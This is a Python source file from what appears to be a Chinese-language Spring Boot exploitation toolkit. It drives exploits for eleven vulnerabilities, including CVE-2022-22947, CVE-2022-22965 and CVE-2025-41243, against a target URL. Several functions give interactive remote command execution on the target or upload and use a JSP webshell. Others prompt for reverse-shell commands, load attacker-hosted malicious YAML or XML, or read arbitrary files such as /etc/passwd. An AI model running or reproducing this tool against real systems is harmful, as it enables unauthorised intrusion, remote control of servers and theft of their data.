#!/usr/bin/env python
# coding=utf-8
  ################
 #   AabyssZG   #
################

import sys

from termcolor import cprint

from inc import exploits
from inc.common import exit_interrupt


def run_jeespring(url, proxies, header_new):
    cprint("======开始对目标URL进行2023JeeSpring任意文件上传漏洞利用======", "green")
    result = exploits.check_jeespring_2023(url, proxies, header_new)
    if result:
        cprint("[+] Payload已经发送，成功上传JSP", "red")
        cprint(f'[+] {url} 存在2023JeeSpring任意文件上传漏洞，Poc地址如下：', "red")
        cprint(result["poc"] + '\n', "red")
    else:
        cprint("[-] 2023JeeSpring任意文件上传漏洞不存在\n", "yellow")


def run_cve_2022_22947(url, proxies, header_new):
    cprint("======开始对目标URL进行CVE-2022-22947漏洞利用======", "green")
    result = exploits.check_cve_2022_22947(url, proxies, header_new)
    if not result:
        cprint("[-] CVE-2022-22947漏洞不存在\n", "yellow")
        return
    cprint(f"[+] {result['os']}的Payload已经输出，回显结果如下：", "red")
    print('\n')
    print(result["text"])
    print('\n')
    print("[+] 执行命令模块（输入exit退出）")
    while 1:
        cmd = input("[+] 请输入要执行的命令>>> ")
        if cmd == "exit":
            sys.exit()
        cprint(exploits.exec_cve_2022_22947(url, cmd, proxies, header_new), "green")
        print('\n')


def run_cve_2022_22963(url, proxies, header_new):
    cprint("======开始对目标URL进行CVE-2022-22963漏洞利用======", "green")
    if not exploits.check_cve_2022_22963(url, proxies, header_new):
        cprint("[-] CVE-2022-22963漏洞不存在\n", "yellow")
        return
    cprint(f'[+] {url} 存在编号为CVE-2022-22963的RCE漏洞\n', "red")
    cmd = input("[+] 请输入反弹shell或ping的命令（无回显）>>> ")
    if exploits.exec_cve_2022_22963(url, cmd, proxies, header_new):
        cprint(f'[+] {url} 命令执行成功，请检查是否收到回连\n', "red")
    else:
        cprint("[-] 命令执行失败\n", "yellow")


def run_cve_2022_22965(url, proxies, header_new):
    cprint("======开始对目标URL进行CVE-2022-22965漏洞利用======", "green")
    result = exploits.check_cve_2022_22965(url, proxies, header_new)
    if not result:
        cprint("[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址请手动尝试访问：\n[/shell.jsp?pwd=tomcat&cmd=命令] \n", "yellow")
        return
    shell_url = result["shell"]
    cprint("[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：" + shell_url + "?pwd=tomcat&cmd=whoami", "red")
    while 1:
        cmd = input("[+] 请输入要执行的命令>>> ")
        if cmd == "exit":
            sys.exit(0)
        output = exploits.exec_cve_2022_22965(shell_url, cmd, proxies)
        if output is None:
            cprint("[-] 重发包返回状态码500，请手动尝试利用WebShell：shell.jsp?pwd=tomcat&cmd=whoami\n", "yellow")
            break
        cprint(output, "green")


def run_cve_2021_21234(url, proxies, header_new):
    cprint("======开始对目标URL进行CVE-2021-21234漏洞测试======", "green")
    result = exploits.check_cve_2021_21234(url, proxies, header_new)
    if result:
        cprint(f"[+] 发现Spring Boot目录遍历漏洞且系统为{result['os']}，Poc路径如下：", "red")
        for poc_url in result["pocs"]:
            cprint(poc_url, "red")
        print()
    else:
        cprint("[-] 未发现Spring Boot目录遍历漏洞\n", "yellow")


def run_snakeyaml(url, proxies, header_new):
    cprint("======开始对目标URL进行SnakeYAML RCE漏洞测试======", "green")
    version = exploits.check_snakeyaml(url, proxies, header_new)
    if not version:
        cprint("[-] 未发现SnakeYAML-RCE漏洞\n", "yellow")
        return
    cprint(f"[+] 发现SnakeYAML-RCE漏洞，版本为Spring {version}", "red")
    evil_url = input("[+] 请输入恶意yaml所在的URL（如：http://chybeta.com/example.yml）>>> ").strip()
    if exploits.exploit_snakeyaml(url, version, evil_url, proxies, header_new):
        cprint("[+] 恶意yaml已经成功加载，请检查是否有回连", "red")
    else:
        cprint("[-] 恶意yaml加载失败\n", "yellow")


def run_eureka(url, proxies, header_new):
    cprint("======开始对目标URL进行Eureka_Xstream反序列化漏洞测试======", "green")
    if not exploits.check_eureka(url, proxies, header_new):
        cprint("[-] 未发现Eureka_Xstream反序列化漏洞\n", "yellow")
        return
    selectd = input("\n[+] 可能存在Eureka_Xstream反序列化漏洞，因该漏洞可能会破坏业务，是否要发送Exploit（Y/N）: ")
    if selectd != "Y":
        cprint("[.] 已经手动取消发送该Exploit\n", "yellow")
        return
    version = exploits.verify_eureka(url, proxies, header_new)
    if not version:
        cprint("[-] 未发现Eureka_Xstream反序列化漏洞\n", "yellow")
        return
    cprint(f"[+] 发现Eureka_Xstream反序列化漏洞，版本为Spring {version}", "red")
    evil_url = input("[+] 请输入恶意xml所在的URL（如：http://chybeta.com/example.xml）>>> ").strip()
    if exploits.exploit_eureka(url, version, evil_url, proxies, header_new):
        cprint("[+] 恶意xml已经成功加载，请检查是否有回连", "red")
    else:
        cprint("[-] 恶意xml加载失败\n", "yellow")


def run_jolokia(url, proxies, header_new):
    cprint("======开始对目标URL进行Jolokia系列RCE漏洞测试======", "green")
    result = exploits.check_jolokia(url, proxies, header_new)
    if not result:
        cprint("[-] Jolokia系列RCE漏洞不存在\n", "yellow")
        return
    if result["type"] == "logback":
        cprint(f'[+] {url} 存在Jolokia-Logback-JNDI-RCE漏洞，Poc地址如下：', "red")
    elif result["type"] == "realm":
        cprint(f'[+] {url} 存在Jolokia-Realm-JNDI-RCE漏洞，Poc地址如下：', "red")
    else:
        cprint(f'[.] 未发现jolokia/list路径存在关键词，请手动验证：', "yellow")
    cprint(result["poc"] + '\n', "red")


def run_cve_2018_1273(url, proxies, header_new):
    cprint("======开始对目标URL进行Spring_Data_Commons远程命令执行漏洞测试======", "green")
    if not exploits.check_cve_2018_1273(url, proxies, header_new):
        cprint("[-] 未发现Spring_Data_Commons远程命令执行漏洞\n", "yellow")
        return
    cprint("[+] 发现Spring_Data_Commons远程命令执行漏洞：", "red")
    cprint('漏洞存在路径为 ' + url + 'users\n', "red")
    print("[+] 执行命令模块（输入exit退出）")
    choose = input("[+] 总共有两种Payload，请输入1或者2>>> ")
    while 1:
        cmd = input("[+] 请输入要执行的命令>>> ")
        if cmd == "exit":
            sys.exit(0)
        if exploits.exec_cve_2018_1273(url, cmd, choose, proxies, header_new):
            cprint('[+] 该Payload已经打出，由于该漏洞无回显，请用Dnslog进行测试\n', "red")


def run_cve_2025_41243(url, proxies, header_new):
    cprint("======开始对目标URL进行CVE-2025-41243漏洞利用======", "green")
    result = exploits.check_cve_2025_41243(url, proxies, header_new)
    if not result:
        cprint("[-] CVE-2025-41243漏洞不存在\n", "yellow")
        return
    cprint("[+] Payload已经输出，回显结果如下：", "red")
    print('\n')
    print(result["text"])
    print('\n')
    print("[+] 设置环境变量模块（输入exit退出）")
    while 1:
        do = input("[+] 输入1来设置环境变量，输入2来读取任意文件>>> ")
        if do == "exit":
            sys.exit()
        if do == "1":
            key = input("[+] 请输入要设置的环境的键>>> ")
            if key == "exit":
                sys.exit()
            value = input("[+] 请输入要设置的环境的值>>> ")
            cprint(exploits.exec_41243_setenv(url, key, value, proxies, header_new), "green")
            print('\n')
        elif do == "2":
            is_windows = input("[+] 目标是否为Windows系统？（y/n）>>> ")
            if is_windows == 'y':
                file_path = input("[+] 请输入要读取的文件路径（如C:\\Windows\\win.ini）>>> ")
            else:
                file_path = input("[+] 请输入要读取的文件路径（如/etc/passwd）>>> ")
            cprint(exploits.exec_41243_readfile(url, file_path, is_windows == 'y', proxies, header_new), "green")
            print('\n')


def run_cve_2024_37084(url, proxies, header_new):
    cprint("======开始对目标URL进行CVE-2024-37084漏洞利用======", "green")
    if not exploits.check_cve_2024_37084(url, proxies, header_new):
        cprint("[-] CVE-2024-37084远程命令执行漏洞不存在\n", "yellow")
        return
    cprint("[+] CVE-2024-37084远程命令执行漏洞可能存在，请输入dnslog提供的域名进一步验证\n", "red")
    dnslog = input("[+] 请输入DNSLOG的域名，或是恶意payload的地址>>> ").strip()
    if dnslog.startswith("http://"):
        dnslog = dnslog[7:]
    if exploits.exploit_cve_2024_37084(url, dnslog, proxies, header_new):
        cprint(f"[+] 目标 {url} 存在CVE-2024-37084远程命令执行漏洞，已成功触发DNSLOG", "red")
        cprint(f"[+] 请前往DNSLOG平台查看是否有记录回连，并考虑使用https://github.com/artsploit/yaml-payload进行进一步RCE利用", "red")
        cprint(f"[+] 将请求yaml-payload的地址填到原本dnslog位置即可\n", "red")
    else:
        cprint("[-] CVE-2024-37084远程命令执行漏洞不存在\n", "yellow")


RUNNERS = {
    1: run_jeespring,
    2: run_cve_2022_22947,
    3: run_cve_2022_22963,
    4: run_cve_2022_22965,
    5: run_cve_2021_21234,
    6: run_snakeyaml,
    7: run_eureka,
    8: run_jolokia,
    9: run_cve_2018_1273,
    10: run_cve_2025_41243,
    11: run_cve_2024_37084,
}


def vul(url, proxies, header_new):
    cprint("[+] 目前漏洞库内容如下：", "green")
    for num, (name, _) in exploits.VULNS.items():
        print(f" {num}: {name}")
    choices = exploits.ask_choices("\n请输入要检测的漏洞 (例子：1,3,5 直接回车即检测全部漏洞): ")
    if choices is None:
        print("请不要输入无意义的字符串")
        sys.exit()
    for choice in choices:
        runner = RUNNERS.get(choice)
        if runner:
            try:
                runner(url, proxies, header_new)
            except KeyboardInterrupt:
                exit_interrupt()
        else:
            print(f"{choice} 输入错误，请重新输入漏洞选择模块\n")
            break
    cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
    sys.exit()
